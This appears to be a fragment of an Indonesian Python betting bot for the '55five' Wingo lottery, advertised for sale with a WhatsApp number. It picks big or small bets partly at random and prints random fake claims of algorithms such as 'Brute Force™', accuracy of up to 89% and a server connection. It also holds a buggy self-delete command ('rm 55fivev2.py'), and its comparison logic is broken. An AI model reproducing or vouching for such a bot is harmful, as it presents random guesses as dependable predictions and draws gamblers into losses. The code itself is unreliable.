       auto_besarX2e()
      elif res == '2':
       auto_kecilX2e()
      elif res == '3':
       auto_besarX2e()
      elif res == '4':
       auto_kecilX2e()
      elif res == '5':
       auto_besarX2e()
      elif res == '4':
       auto_kecilX2e()
      else:
       auto_besarX2e()

def rumusXikut ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       A1 = ['3','6','7','1','9','0','8','2','5','4']
       m = random.SystemRandom()
       v1 = m.choice(v2)
       wew = m.choice(A1)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result2 = (f"{wew}")
      result3 = int(result2)+int(result2)
      with open("result4.txt",'w') as f:
       f.write(str(result3))
       f.close()
      res = open("halaman1.txt").read()
      if res == '0':
       auto_kecilX1()
      elif res == '1':
       auto_kecilX3()
      elif res == '2':
       auto_kecilX5()
      elif res == '3':
       auto_kecilX7()
      elif res == '4':
       auto_kecilX9()
      elif res == '5':
       auto_besarX1()
      elif res == '6':
       auto_besarX3()
      elif res == '7':
       auto_besarX5()
      elif res == '8':
       auto_besarX7()
      elif res == '9':
       auto_besarX9()
      else:
        auto_besarX5()

			
def rumusX1 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       A1 = ['0','1','2']
       m = random.SystemRandom()
       v1 = m.choice(v2)
       wew = m.choice(A1)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)
      result2 = (f"{wew}")
      result3 = int(j1)+int(result2)
      with open("result4.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("result4.txt").read()
      if res > '4':
        auto_besarX1()
      elif res < '5':
        auto_kecilX1()
      else:
        auto_besarX1()
       
       
def rumusX2 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       A1 = ['0','1','2']
       m = random.SystemRandom()
       v1 = m.choice(v2)
       wew = m.choice(A1)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)
      result2 = (f"{wew}")
      result3 = int(j1)+int(result2)
      with open("result4.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("result4.txt").read()
      if res > '4':
        auto_besarX2()
      elif res < '5':
        auto_kecilX2()
      else:
        auto_besarX2()

def rumusX3 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       A1 = ['0','1','2']
       m = random.SystemRandom()
       v1 = m.choice(v2)
       wew = m.choice(A1)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)
      result2 = (f"{wew}")
      result3 = int(j1)+int(result2)
      with open("result4.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("result4.txt").read()
      if res > '4':
        auto_besarX3()
      elif res < '5':
        auto_kecilX3()
      else:
        auto_besarX3()


def halaman1 ():
    # data = '{"pageNo":1,"typeId":1,"language":0}'
    response = response_GetNoaverageEmerdList()
    b = json.loads(response.text)
    # pp.pprint(b)
    c = b.get('data')
    d = c.get('list')
    # pp.pprint(d[0])
    e1 = d[0].get('number')
    e2 = d[0].get('number')
    e6 = d[0].get('issueNumber')
    e10 = d[0].get('number')
    with open("halaman1.txt", 'w') as f:
        f.write(str(e2))
        f.close()
       
def gameissue ():
    # data = {
    # 'typeid' : '1',
    # 'language' : '1'
    # }
    # session = requests.Session()
    # a = session.post('https://newapi.55lottertttapi.com/api/webapi/GetGameIssue', data = data)

    response = response_GetGameIssue()
    b = json.loads(response.text)
    # pp.pprint(b)
    c = b.get('data')
    d = c.get('issueNumber')
    with open('issuenumber.txt', 'w') as f:
        f.write(str(d))
        f.close()
				
				
def rumusX4 ():
    halaman1()
    data = {
    'typeid' : '1',
    'pageno' : '144',
    'language' : 'id'
    }

    response = response_GetNoaverageEmerdList()
    b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e1 = d[0].get('number')
    e5 = d[4].get('number')
    e6 = d[9].get('issueNumber')
    e10 = d[9].get('number')
    with open("halaman144.txt", 'w') as f:
        f.write(str(e10))
        f.close()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    wwr = d[0].get('colour')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    with open("WR.txt", 'w') as g:
        g.write(wwr)
        g.close()
        v2 = ['0','1','2','3','4','5','6','7','8','9','10']
        A1 = ['0','1','2']
        m = random.SystemRandom()
        v1 = m.choice(v2)
        wew = m.choice(A1)
        j = open("halaman144.txt").read()
        j1 = open("halaman1.txt").read()
        result = int(j1)
        result2 = (f"{wew}")
        result3 = int(result2)+int(j1)
    with open("result33.txt",'w') as f:
        f.write(str(result3))
        f.close()
        res = open("result33.txt").read()
    if res > '4':
      auto_besarX4()
    elif res < '5':
      auto_kecilX4()
    else:
      auto_besarX4()
       
       
def rumusX5 ():
    halaman1()
    data = {
    'typeid' : '1',
    'pageno' : '144',
    'language' : 'id'
    }

    response = response_GetNoaverageEmerdList()
    b = json.loads(response.text)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()
    # b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e1 = d[0].get('number')
    e5 = d[4].get('number')
    e6 = d[9].get('issueNumber')
    e10 = d[9].get('number')
    with open("halaman144.txt", 'w') as f:
        f.write(str(e10))
        f.close()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    wwr = d[0].get('colour')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    with open("WR.txt", 'w') as g:
        g.write(wwr)
        g.close()
        v2 = ['0','1','2','3','4','5','6','7','8','9','10']
        A1 = ['0','1','2']
        m = random.SystemRandom()
        v1 = m.choice(v2)
        wew = m.choice(A1)
        j = open("halaman144.txt").read()
        j1 = open("halaman1.txt").read()
        result = int(j1)
        result2 = (f"{wew}")
        result3 = int(result2)+int(j1)
    with open("result33.txt",'w') as f:
        f.write(str(result3))
        f.close()
        res = open("result33.txt").read()
    if res > '4':
      auto_besarX5()
    elif res < '5':
      auto_kecilX5()
    else:
      auto_besarX5()
     
def rumusX6 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       A1 = ['0','1','2']
       m = random.SystemRandom()
       v1 = m.choice(v2)
       wew = m.choice(A1)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)
      result2 = (f"{wew}")
      result3 = int(j1)+int(result2)
      with open("result4.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("result4.txt").read()
      if res > '4':
        auto_kecilX6()
      elif res < '5':
        auto_besarX6()
      else:
        auto_besarX6()
       
def rumusX7 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       A1 = ['0','1','2']
       m = random.SystemRandom()
       v1 = m.choice(v2)
       wew = m.choice(A1)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)
      result2 = (f"{wew}")
      result3 = int(j1)+int(result2)
      with open("result4.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("result4.txt").read()
      if res > '4':
       auto_besarX7()
      elif res < '5':
       auto_kecilX7()
      else:
       auto_besarX7()
       
       
def rumusX10 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
       v2 = ['0','1','2','3','4','5','6','7','8','9','10']
       A1 = ['8','6','1','7','9','0','3','2','5','4']
       m = random.SystemRandom()
       v1 = m.choice(v2)
       wew = m.choice(A1)
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)
      result2 = (f"{wew}")
      result3 = int(result)+int(result2)
      with open("result3.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("result3.txt").read()
      if res == '0':
       auto_besarX10()
      elif res == '1':
       auto_besarX10()
      elif res == '2':
       auto_besarX10()
      elif res == '3':
       auto_besarX10()
      elif res == '4':
       auto_besarX10()
      elif res == '5':
       auto_kecilX10()
      elif res == '6':
       auto_kecilX10()
      elif res == '7':
       auto_kecilX10()
      elif res == '8':
       auto_kecilX10()
      elif res == '9':
       auto_kecilX10()
      elif res == '10':
       auto_besarX10()
      elif res == '11':
       auto_besarX10()
      elif res == '12':
       auto_besarX10()
      elif res == '13':
       auto_besarX10()
      elif res == '14':
       auto_besarX10()
      elif res == '15':
       auto_kecilX10()
      elif res == '16':
       auto_kecilX10()
      elif res == '17':
       auto_kecilX10()
      elif res == '18':
       auto_kecilX10()
      elif res == '19':
       auto_kecilX10()
      elif res == '20':
       auto_besarX10()
      elif res == '21':
       auto_besarX10()
      elif res == '22':
       auto_besarX10()
      elif res == '23':
       auto_besarX10()
      elif res == '24':
       auto_besarX10()
      elif res == '25':
       auto_kecilX10()
      elif res == '26':
       auto_kecilX10()
      elif res == '27':
       auto_kecilX10()
      elif res == '28':
       auto_kecilX10()
      elif res == '29':
       auto_kecilX10()
      elif res == '30':
       auto_besarX10()
      elif res == '31':
       auto_besarX10()
      elif res == '32':
       auto_besarX10()
      elif res == '33':
       auto_besarX10()
      elif res == '34':
       auto_besarX10()
      elif res == '35':
       auto_besarX10()
      elif res == '36':
       auto_besarX10()
      elif res == '37':
       auto_besarX10()
      elif res == '38':
       auto_besarX10()
      elif res == '39':
       auto_besarX10()
      else:
       auto_besarX10()
       
       
def rumusX11 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(2)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("halaman144").read()
      if res == '0':
       auto_besarX11()
      elif res == '1':
       auto_besarX11()
      elif res == '2':
       auto_besarX11()
      elif res == '3':
       auto_besarX11()
      elif res == '4':
       auto_besarX11()
      elif res == '5':
       auto_kecilX11()
      elif res == '6':
       auto_kecilX11()
      elif res == '7':
       auto_kecilX11()
      elif res == '8':
       auto_kecilX11()
      elif res == '9':
       auto_kecilX11()
      elif res == '10':
       auto_besarX11()
      elif res == '11':
       auto_besarX11()
      elif res == '12':
       auto_besarX11()
      elif res == '13':
       auto_besarX11()
      elif res == '14':
       auto_besarX11()
      elif res == '15':
       auto_kecilX11()
      elif res == '16':
       auto_kecilX11()
      elif res == '17':
       auto_kecilX11()
      elif res == '18':
       auto_kecilX11()
      elif res == '19':
       auto_kecilX11()
      elif res == '20':
       auto_besarX11()
      elif res == '21':
       auto_besarX11()
      elif res == '22':
       auto_besarX11()
      elif res == '23':
       auto_besarX11()
      elif res == '24':
       auto_besarX11()
      elif res == '25':
       auto_kecilX11()
      elif res == '26':
       auto_kecilX11()
      elif res == '27':
       auto_kecilX11()
      elif res == '28':
       auto_kecilX11()
      elif res == '29':
       auto_kecilX11()
      elif res == '30':
       auto_besarX11()
      elif res == '31':
       auto_besarX11()
      elif res == '32':
       auto_besarX11()
      elif res == '33':
       auto_besarX11()
      elif res == '34':
       auto_besarX11()
      elif res == '35':
       auto_besarX11()
      elif res == '36':
       auto_besarX11()
      elif res == '37':
       auto_besarX11()
      elif res == '38':
       auto_besarX11()
      elif res == '39':
       auto_besarX11()
      else:
       auto_besarX11()
       
       
def rumusX12 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(5)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("result.txt").read()
      if res == '0':
       auto_besarX12()
      elif res == '1':
       auto_besarX12()
      elif res == '2':
       auto_besarX12()
      elif res == '3':
       auto_besarX12()
      elif res == '4':
       auto_besarX12()
      elif res == '5':
       auto_kecilX12()
      elif res == '6':
       auto_kecilX12()
      elif res == '7':
       auto_kecilX12()
      elif res == '8':
       auto_kecilX12()
      elif res == '9':
       auto_kecilX12()
      elif res == '10':
       auto_besarX12()
      elif res == '11':
       auto_besarX12()
      elif res == '12':
       auto_besarX12()
      elif res == '13':
       auto_besarX12()
      elif res == '14':
       auto_besarX12()
      elif res == '15':
       auto_kecilX12()
      elif res == '16':
       auto_kecilX12()
      elif res == '17':
       auto_kecilX12()
      elif res == '18':
       auto_kecilX12()
      elif res == '19':
       auto_kecilX12()
      elif res == '20':
       auto_besarX12()
      elif res == '21':
       auto_besarX12()
      elif res == '22':
       auto_besarX12()
      elif res == '23':
       auto_besarX12()
      elif res == '24':
       auto_besarX12()
      elif res == '25':
       auto_kecilX12()
      elif res == '26':
       auto_kecilX12()
      elif res == '27':
       auto_kecilX12()
      elif res == '28':
       auto_kecilX12()
      elif res == '29':
       auto_kecilX12()
      elif res == '30':
       auto_besarX12()
      elif res == '31':
       auto_besarX12()
      elif res == '32':
       auto_besarX12()
      elif res == '33':
       auto_besarX12()
      elif res == '34':
       auto_besarX12()
      elif res == '35':
       auto_besarX12()
      elif res == '36':
       auto_besarX12()
      elif res == '37':
       auto_besarX12()
      elif res == '38':
       auto_besarX12()
      elif res == '39':
       auto_besarX12()
      else:
       auto_besarX12()
       
       
def rumusX13 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(5)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("result.txt").read()
      if res == '0':
       auto_kecilX13()
      elif res == '1':
       auto_kecilX13()
      elif res == '2':
       auto_kecilX13()
      elif res == '3':
       auto_kecilX13()
      elif res == '4':
       auto_kecilX13()
      elif res == '5':
       auto_besarX13()
      elif res == '6':
       auto_besarX13()
      elif res == '7':
       auto_besarX13()
      elif res == '8':
       auto_besarX13()
      elif res == '9':
       auto_besarX13()
      elif res == '10':
       auto_kecilX13()
      elif res == '11':
       auto_kecilX13()
      elif res == '12':
       auto_kecilX13()
      elif res == '13':
       auto_kecilX13()
      elif res == '14':
       auto_kecilX13()
      elif res == '15':
       auto_besarX13()
      elif res == '16':
       auto_besarX13()
      elif res == '17':
       auto_besarX13()
      elif res == '18':
       auto_besarX13()
      elif res == '19':
       auto_besarX13()
      elif res == '20':
       auto_kecilX13()
      elif res == '21':
       auto_kecilX13()
      elif res == '22':
       auto_kecilX13()
      elif res == '23':
       auto_kecilX13()
      elif res == '24':
       auto_kecilX13()
      elif res == '25':
       auto_besarX13()
      elif res == '26':
       auto_besarX13()
      elif res == '27':
       auto_besarX13()
      elif res == '28':
       auto_besarX13()
      elif res == '29':
       auto_besarX13()
      elif res == '30':
       auto_kecilX13()
      elif res == '31':
       auto_kecilX13()
      elif res == '32':
       auto_kecilX13()
      elif res == '33':
       auto_kecilX13()
      elif res == '34':
       auto_kecilX13()
      elif res == '35':
       auto_besarX13()
      elif res == '36':
       auto_besarX13()
      elif res == '37':
       auto_besarX13()
      elif res == '38':
       auto_besarX13()
      elif res == '39':
       auto_besarX13()
      else:
       auto_kecilX13()
       
       
def rumusX14 ():
      halaman1()
      data = {
      'typeid' : '1',
      'pageno' : '144',
      'language' : 'id'
      }
      session = requests.Session()
      a = response_GetNoaverageEmerdList()
      b = json.loads(a.text)
      c = b.get('data')
      d = c.get('list')
      e1 = d[0].get('number')
      e5 = d[4].get('number')
      e6 = d[9].get('issueNumber')
      e10 = d[9].get('number')
      with open("halaman144.txt", 'w') as f:
       f.write(str(e10))
       f.close()
      j = open("halaman144.txt").read()
      j1 = open("halaman1.txt").read()
      result = int(j1)+int(5)
      with open("result.txt",'w') as f:
       f.write(str(result))
       f.close()
      res = open("result.txt").read()
      if res == '0':
       auto_kecilX14()
      elif res == '1':
       auto_kecilX14()
      elif res == '2':
       auto_besarX14()
      elif res == '3':
       auto_kecilX14()
      elif res == '4':
       auto_kecilX14()
      elif res == '5':
       auto_besarX14()
      elif res == '6':
       auto_besarX14()
      elif res == '7':
       auto_besarX14()
      elif res == '8':
       auto_besarX14()
      elif res == '9':
       auto_besarX14()
      elif res == '10':
       auto_kecilX14()
      elif res == '11':
       auto_kecilX14()
      elif res == '12':
       auto_kecilX14()
      elif res == '13':
       auto_kecilX14()
      elif res == '14':
       auto_kecilX14()
      elif res == '15':
       auto_besarX14()
      elif res == '16':
       auto_besarX14()
      elif res == '17':
       auto_besarX14()
      elif res == '18':
       auto_besarX14()
      elif res == '19':
       auto_besarX14()
      elif res == '20':
       auto_kecilX14()
      elif res == '21':
       auto_kecilX14()
      elif res == '22':
       auto_kecilX14()
      elif res == '23':
       auto_kecilX14()
      elif res == '24':
       auto_kecilX14()
      elif res == '25':
       auto_besarX14()
      elif res == '26':
       auto_besarX14()
      elif res == '27':
       auto_besarX14()
      elif res == '28':
       auto_besarX14()
      elif res == '29':
       auto_besarX14()
      elif res == '30':
       auto_kecilX14()
      elif res == '31':
       auto_kecilX14()
      elif res == '32':
       auto_kecilX14()
      elif res == '33':
       auto_kecilX14()
      elif res == '34':
       auto_kecilX14()
      elif res == '35':
       auto_besarX14()
      elif res == '36':
       auto_besarX14()
      elif res == '37':
       auto_besarX14()
      elif res == '38':
       auto_besarX14()
      elif res == '39':
       auto_besarX14()
      else:
       auto_besarX14()
       

localtime = time.localtime(time.time())
xx = localtime
b = datetime.now()
c = b.day
f = b.hour
d = 5
e = 6
f = 7
g = 8
h = 1
gt = ['RNG-1','RNG-2','RNG-3','RNG-4','RNG-5']
gr = ['WINN','LOSE','WINN','LOSE']
to = ['Recursive','Brute Force™','Loop','Greedy','Backtracking','Hashing']
bk = ['69%','73%','71%','75%','77%','80%','83%','85%','86%','78%','73%','88%','89%']
ii = ['reload jika prediksi mulai jelek','pantau dulu sebelum bet mulai','setiap 5x kena win harap reload','bet kompen sesuai kemampuan saldo, jangan bomb bet']
hh = random.SystemRandom()
jk = hh.choice(gt)
po = hh.choice(to)
pm = hh.choice(gr)
tty = hh.choice(bk)
iii = hh.choice(ii)
if c == b:
	os.system("clear")
	os.system("rm 55fivev2.py")
	time.sleep
	exit(10)
else:
	os.system("clear")
	print(f"{RED}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
	print(f' {GRY}Syncron To RNG...')
os.system("clear")
whoami2()
print(f"{RED}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
print(f"""{G}
    ███████╗███████╗███████╗            {GR}[{UNDER}INFORMASI{L}{GR}]{L}
    {G}██╔════╝██╔════╝██╔════╝         
    {G}██████╗░██████╗░█████╗       {PT}🔹AUTOR   = Racknarock{L}
    {G}╚════██╗╚════██╗██╔══╝       {PT}🔹RNGv27X = {GRY}Ready
    {G}██████╔╝██████╔╗██║░░░██     {PT}🔹LOGIN   = Risk-X
    {G}╚═════╝░╚═════╝░╚═╝          {PT}🔹SERVER  = {WW} {BO}ONLINE{L}{WW} {L}
""")
print(f"{RED}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
print(G+f'  {PT}///////    Order SC : Whats{PT}app 085796297189    \\\\\\\\\\\\\\')
print(f"{RED}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
print(b.strftime(f"{GR1}                 %A, %d %B %Y {L}"))
print(f"{RED}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
print(f"{H} STATUS BOT : {L}")
print("")
print(f' {PT}- Connected to 55five Server...')
print(f' {PT}- Algoritma  : {Y}{po} is running.. {L} ')
print("")
print(f" {H} Game {L} {RED}: {PT1} {UNDER}WINGO 1MENIT{L}{RED} {L}")
print(f"{RED}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
print(f"{GRY}{BO} {UNDER}Lakukan Reload jika dalam 5 periode muncul k3{L}{BO} {L}")
print(L+G+"┏━━━━━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━┓")
print(G+f"┃{G}{WW2}   Periode™   {L}{G}┃{G}{WW2} Prediksi {L}{G}┃{G}{WW2}   Hasil   {L}{G}┃{G}{WW2}  Status  {L}{G}┃{G}{WW2}COMMAND™{L}{G}┃")
print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
halaman22()
halaman44()
halaman1()
aa = open("halaman1.txt").read()
if aa < '10':
    rumusX1()
else:
    rumusX1()